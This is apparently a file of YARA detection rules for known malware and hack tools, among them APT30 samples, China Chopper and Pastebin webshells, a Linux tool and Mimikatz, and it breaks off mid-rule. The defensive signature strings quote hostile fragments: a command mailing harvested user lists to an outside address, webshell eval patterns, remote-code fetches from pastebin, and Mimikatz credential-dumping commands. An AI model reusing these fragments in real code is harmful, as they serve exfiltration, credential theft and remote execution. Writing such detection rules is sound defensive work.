rule custom_ssh_backdoor_server_RID31F3 : DEMO HKTL SCRIPT T1021_004 T1059_006 {
   meta:
      description = "Custome SSH backdoor based on python and paramiko - file server.py"
      author = "Florian Roth"
      reference = "https://github.com/joridos/custom-ssh-backdoor"
      date = "2015-05-14 13:44:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "DEMO, HKTL, SCRIPT, T1021_004, T1059_006"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "command= raw_input(\"Enter command: \").strip('n')" fullword ascii
      $s1 = "print '[-] (Failed to load moduli -- gex will be unsupported.)'" fullword ascii
      $s2 = "print '[-] Listen/bind/accept failed: ' + str(e)" fullword ascii
   condition: 
      2 of them
}

rule MAL_Rombertik_CarbonGrabber_RID3162 : DEMO EXE FILE MAL {
   meta:
      description = "Detects CarbonGrabber alias Rombertik - file Copy#064046.scr"
      author = "Florian Roth"
      reference = "http://blogs.cisco.com/security/talos/rombertik"
      date = "2015-05-05 13:20:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2f9b26b90311e62662c5946a1ac600d2996d3758"
      hash2 = "aeb94064af2a6107a14fd32f39cb502e704cd0ab"
      hash3 = "c2005c8d1a79da5e02e6a15d00151018658c264c"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "ZwGetWriteWatch" fullword ascii
      $x2 = "OutputDebugStringA" fullword ascii
      $x3 = "malwar" fullword ascii
      $x4 = "sampl" fullword ascii
      $x5 = "viru" fullword ascii
      $x6 = "sandb" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5MB and all of them
}

rule APT30_Sample_17_RID2BE1 : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Nkfvtyvn}]ty}ztU" fullword ascii
      $s4 = "IEXPL0RE" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_H_RID2C1C : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2a4c8752f3e7fde0139421b8d5713b29c720685d"
      hash2 = "4350e906d590dca5fcc90ed3215467524e0a4e3d"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\\Temp1020.txt" ascii
      $s1 = "Xmd.Txe" fullword ascii
      $s2 = "\\Internet Exp1orer" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_3_RID2BAC : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "Software\\Mic" ascii
      $s6 = "HHOSTR" ascii
      $s9 = "ThEugh" fullword ascii
      $s10 = "Moziea/" ascii
      $s12 = "%s%s(X-" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_4_RID2BAD : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:16:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "GetStartupIn" ascii
      $s1 = "enMutex" ascii
      $s2 = "tpsvimi" ascii
      $s3 = "reateProcesy" ascii
      $s5 = "FreeLibr1y*S" ascii
      $s6 = "foAModuleHand" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_7_RID2BB0 : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:17:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "datain" fullword ascii
      $s3 = "C:\\Prog" ascii
      $s4 = "$LDDATA$" ascii
      $s5 = "Maybe a Encrypted Flash" fullword ascii
      $s6 = "Jean-loup Gailly" ascii
      $s8 = "deflate 1.1.3 Copyright" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_E_RID2C19 : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1dbb584e19499e26398fb0a7aa2a01b7"
      hash2 = "572c9cd4388699347c0b2edb7c6f5e25"
      hash3 = "8ff473bedbcc77df2c49a91167b1abeb"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Nkfvtyvn}" ascii
      $s6 = "----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_B_RID2C16 : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0fcb4ffe2eb391421ec876286c9ddb6c"
      hash2 = "29395c528693b69233c1c12bef8a64b3"
      hash3 = "4c6b21e98ca03e0ef0910e07cef45dac"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "Moziea/4.0" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_I_RID2C1D : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fe211c7a081c1dac46e3935f7c614549"
      hash2 = "8c9db773d387bf9b3f2b6a532e4c937c"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Copyright 2012 Google Inc. All rights reserved." fullword wide
      $s1 = "(Prxy%c-%s:%u)" fullword ascii
      $s2 = "Google Inc." fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_9_RID2BB2 : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:17:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\\Windo" ascii
      $s2 = "oHHOSTR" ascii
      $s3 = "Softwa]\\Mic" ascii
      $s4 = "Startup'T" ascii
      $s6 = "Ora\\%^" ascii
      $s7 = "\\Ohttp=r" ascii
      $s17 = "help32Snapshot0L" ascii
      $s18 = "TimUmoveH" ascii
      $s20 = "WideChc[lobalAl" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_12_RID2BDC : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Richic" fullword ascii
      $s1 = "Accept: image/gif, */*" fullword ascii
      $s2 = "----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d" fullword ascii
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_15_RID2BDF : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\\Windo" ascii
      $s2 = "HHOSTR" ascii
      $s3 = "Softwa]\\Mic" ascii
      $s4 = "Startup'T" fullword ascii
      $s17 = "help32Snapshot0L" fullword ascii
      $s18 = "TimUmoveH" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_16_RID2BE0 : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\\Temp1020.txt" ascii
      $s1 = "cmcbqyjs" fullword ascii
      $s2 = "SPVSWh\\" fullword ascii
      $s4 = "PSShxw@" fullword ascii
      $s5 = "VWhHw@" fullword ascii
      $s7 = "SVWhHw@" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_A_RID2C15 : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:34:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f49aa1090fa478b9857e15695be4a89f8f3e594"
      hash2 = "396116cfb51cee090822913942f6ccf81856c2fb"
      hash3 = "fef9c3b4b35c226501f7d60816bb00331a904d5b"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "WPVWhhiA" fullword ascii
      $s6 = "VPWVhhiA" fullword ascii
      $s11 = "VPhhiA" fullword ascii
      $s12 = "uUhXiA" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_G_RID2C1B : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "%s\\%s\\%s=%s" fullword ascii
      $s1 = "Copy File %s OK!" fullword ascii
      $s2 = "%s Space:%uM,FreeSpace:%uM" fullword ascii
      $s4 = "open=%s" fullword ascii
      $s5 = "Maybe a Encrypted Flash Disk" fullword ascii
      $s12 = "%04u-%02u-%02u %02u:%02u:%02u" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_19_RID2BE3 : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "C:\\Program Files\\Common Files\\System\\wab32" fullword ascii
      $s1 = "%s,Volume:%s,Type:%s,TotalSize:%uMB,FreeSize:%uMB" fullword ascii
      $s2 = "\\TEMP\\" ascii
      $s3 = "\\Temporary Internet Files\\" ascii
      $s5 = "%s TotalSize:%u Bytes" fullword ascii
      $s6 = "This Disk Maybe a Encrypted Flash Disk!" fullword ascii
      $s7 = "User:%-32s" fullword ascii
      $s8 = "\\Desktop\\" ascii
      $s9 = "%s.%u_%u" fullword ascii
      $s10 = "Nick:%-32s" fullword ascii
      $s11 = "E-mail:%-32s" fullword ascii
      $s13 = "%04u-%02u-%02u %02u:%02u:%02u" fullword ascii
      $s14 = "Type:%-8s" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 8 of them
}

rule APT30_Generic_E_v2_RID2D20 : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 10:18:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Nkfvtyvn}duf_Z}{Ys" fullword ascii
      $s1 = "Nkfvtyvn}*Zrswru1i" fullword ascii
      $s2 = "Nkfvtyvn}duf_Z}{V" fullword ascii
      $s3 = "Nkfvtyvn}*ZrswrumT\\b" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_23_RID2BDE : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:51"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "hostid" ascii
      $s1 = "\\Window" ascii
      $s2 = "%u:%u%s" fullword ascii
      $s5 = "S2tware\\Mic" ascii
      $s6 = "la/4.0 (compa" ascii
      $s7 = "NameACKernel" fullword ascii
      $s12 = "ToWideChc[lo" fullword ascii
      $s14 = "help32SnapshotfL" ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_27_RID2BE2 : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:25:31"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Mozilla/4.0" fullword ascii
      $s1 = "dizhi.gif" fullword ascii
      $s5 = "oftHaveAck+" ascii
      $s10 = "HlobalAl" fullword ascii
      $s13 = "$NtRND1$" fullword ascii
      $s14 = "_NStartup" ascii
      $s16 = "GXSYSTEM" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_30_RID2BDC : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "5.1.2600.2180 (xpsp_sp2_rtm.040803-2158)" fullword wide
      $s3 = "RnhwtxtkyLRRMf{jJ}ny" fullword ascii
      $s4 = "RnhwtxtkyLRRJ}ny" fullword ascii
      $s5 = "ZRLDownloadToFileA" fullword ascii
      $s9 = "5.1.2600.2180" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Sample_31_RID2BDD : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:24:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\\ZJRsv.tem" ascii
      $s1 = "forceguest" fullword ascii
      $s4 = "\\$NtUninstallKB570317$" ascii
      $s8 = "[Can'tGetIP]" fullword ascii
      $s14 = "QWERTY:,`/" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Microfost_RID2C6E : APT DEMO FILE G0013 {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, G0013"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Copyright (c) 2007 Microfost All Rights Reserved" fullword wide
      $s2 = "Microfost" fullword wide
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_K_RID2C1F : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:35:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Maybe a Encrypted Flash" fullword ascii
      $s0 = "C:\\Program Files\\Common Files\\System\\wab32" fullword ascii
      $s1 = "\\TEMP\\" ascii
      $s2 = "\\Temporary Internet Files\\" ascii
      $s5 = "%s Size:%u Bytes" fullword ascii
      $s7 = "$.DATA$" fullword ascii
      $s10 = "? Size:%u By s" fullword ascii
      $s12 = "Maybe a Encrypted Flash" fullword ascii
      $s14 = "Name:%-32s" fullword ascii
      $s15 = "NickName:%-32s" fullword ascii
      $s19 = "Email:%-32s" fullword ascii
      $s21 = "C:\\Prog" ascii
      $s22 = "$LDDATA$" ascii
      $s31 = "Copy File %s OK!" fullword ascii
      $s32 = "%s Space:%uM,FreeSpace:%uM" fullword ascii
      $s34 = "open=%s" fullword ascii
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and ( all of ( $x* ) and 3 of ( $s* ) )
}

rule APT30_Generic_1_RID2C05 : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:31:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cb4263cab467845dae9fae427e3bbeb31c6a14c2"
      hash2 = "b69b95db8a55a050d6d6c0cba13d73975b8219ca"
      hash3 = "5c29e21bbe8873778f9363258f5e570dddcadeb9"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "%s\\%s.txt" fullword
      $s1 = "\\ldsysinfo.txt" 
      $s4 = "(Extended Wansung)" fullword
      $s6 = "Computer Name:" fullword
      $s7 = "%s %uKB %04u-%02u-%02u %02u:%02u" fullword
      $s8 = "ASSAMESE" fullword
      $s9 = "BELARUSIAN" fullword
      $s10 = "(PR China)" fullword
      $s14 = "(French)" fullword
      $s15 = "AdvancedServer" fullword
      $s16 = "DataCenterServer" fullword
      $s18 = "(Finland)" fullword
      $s19 = "%s %04u-%02u-%02u %02u:%02u" fullword
      $s20 = "(Chile)" fullword
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_6_RID2C0A : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample - from files 168d207d0599ed0bb5bcfca3b3e7a9d3, 1e6ee89fddcf23132ee12802337add61, 5dd625af837e164dd2084b1f44a45808"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2c5e347083b77c9ead9e75d41e2fabe096460bba"
      hash2 = "5d39a567b50c74c4a921b5f65713f78023099933"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "GetStar" fullword
      $s1 = ".rdUaS" fullword
      $s2 = "%sOTwp/&A\\L" fullword
      $s3 = "a Encrt% Flash Disk" fullword
      $s4 = "ypeAutoRuChec" fullword
      $s5 = "NoDriveT" fullword
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_7_RID2C0B : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample - from files 853a20f5fc6d16202828df132c41a061, 9c0cad1560cd0ffe2aa570621ef7d0a0, b590c15499448639c2748ff9e0d214b2"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e814914079af78d9f1b71000fee3c29d31d9b586"
      hash2 = "0263de239ccef669c47399856d481e3361408e90"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Xjapor_*ata" fullword
      $s2 = "Xjapor_o*ata" fullword
      $s4 = "Ouopai" fullword
   condition: 
      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT30_Generic_9_RID2C0D : APT DEMO FILE G0013 GEN {
   meta:
      description = "FireEye APT30 Report Sample"
      author = "Florian Roth"
      reference = "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
      date = "2015-04-03 09:32:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "27a2b981d4c0bb8c3628bfe990db4619ddfdff74"
      hash2 = "05f66492c163ec2a24c6a87c7a43028c5f632437"
      hash3 = "263f094da3f64e72ef8dc3d02be4fb33de1fdb96"
      tags = "APT, DEMO, FILE, G0013, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "%s\\%s\\$NtRecDoc$" fullword
      $s1 = "%s(%u)%s" fullword
      $s2 = "http://%s%s%s" fullword
      $s3 = "1.9.1.17" fullword wide
      $s4 = "(C)Firefox and Mozilla Developers, according to the MPL 1.1/GPL 2.0/LGPL" wide
   condition: 
      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them
}

rule APT_WoolenGoldfish_Generic_Mar15_2_RID338B : APT DEMO G0130 GEN {
   meta:
      description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
      author = "Florian Roth"
      reference = "https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-woolen-goldfish-when-kittens-go-phishing"
      date = "2015-03-25 14:52:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "47b1c9caabe3ae681934a33cd6f3a1b311fd7f9f"
      hash2 = "62172eee1a4591bde2658175dd5b8652d5aead2a"
      hash3 = "7fef48e1303e40110798dfec929ad88f1ad4fbd8"
      tags = "APT, DEMO, G0130, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "modules\\exploits\\littletools\\agent_wrapper\\release" ascii
   condition: 
      all of them
}

rule WEBSHELL_ChinaChopper_Generic_Mar15_RID337B : CHINA DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Detects China Chopper webshells"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf"
      date = "2015-03-10 14:49:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-12-14"
      tags = "CHINA, DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x_aspx = /%@\sPage\sLanguage=.Jscript.%><%eval\(Request\.Item\[.{,100}unsafe/ 
      $x_php = /<?php.\@eval\(\$_POST./ 
      $fp1 = "GET /" 
      $fp2 = "POST /" 
   condition: 
      filesize < 300KB and 1 of ( $x* ) and not 1 of ( $fp* )
}

rule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL LINUX {
   meta:
      description = "Linux hack tools - file a"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-01-19 11:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
      $s1 = "mv scan.log bios.txt" fullword ascii
      $s2 = "rm -rf bios.txt" fullword ascii
      $s3 = "echo -e \"# by Eyes.\"" fullword ascii
      $s4 = "././pscan2 $1 22" fullword ascii
      $s10 = "echo \"#cautam...\"" fullword ascii
   condition: 
      2 of them
}

rule Pastebin_Webshell_RID2DDC : DEMO SCRIPT T1505_003 T1569_002 WEBSHELL {
   meta:
      description = "Detects a web shell that downloads content from pastebin.com https://blog.sucuri.net/2015/01/website-backdoors-leverage-the-pastebin-service.html"
      author = "Florian Roth"
      reference = "https://blog.sucuri.net/2015/01/website-backdoors-leverage-the-pastebin-service.html"
      date = "2015-01-13 10:49:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "DEMO, SCRIPT, T1505_003, T1569_002, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "file_get_contents(\"http://pastebin.com" ascii
      $s1 = "xcurl('http://pastebin.com/download.php" ascii
      $s2 = "xcurl('http://pastebin.com/raw.php" ascii
      $x0 = "if($content){unlink('evex.php');" ascii
      $x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
      $y0 = "file_put_contents($pth" ascii
      $y1 = "echo \"<login_ok>" ascii
      $y2 = "str_replace('* @package Wordpress',$temp" ascii
   condition: 
      1 of ( $s* ) or all of ( $x* ) or all of ( $y* )
}

rule Mimikatz_Memory_Rule_1_RID2FB6 : APT DEMO HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 T1569_002 {
   meta:
      description = "Detects password dumper mimikatz in memory (False Positives: an service that could have copied a Mimikatz executable, AV signatures)"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-22 12:08:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-07-04"
      tags = "APT, DEMO, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003, T1569_002"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "sekurlsa::wdigest" fullword ascii
      $s2 = "sekurlsa::logonPasswords" fullword ascii
      $s3 = "sekurlsa::minidump" fullword ascii
      $s4 = "sekurlsa::credman" fullword ascii
      $fp1 = "\"x_mitre_version\": " ascii
      $fp2 = "{\"type\":\"bundle\"," 
      $fp3 = "use strict" ascii fullword
      $fp4 = "\"url\":\"https://attack.mitre.org/" ascii
   condition: 
      1 of ( $s* ) and not 1 of ( $fp* )
}

rule SoakSoak_Infected_Wordpress_RID31D6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects a SoakSoak infected Wordpress site https://blog.sucuri.net/2014/12/soaksoak-malware-compromises-100000-wordpress-websites.html"
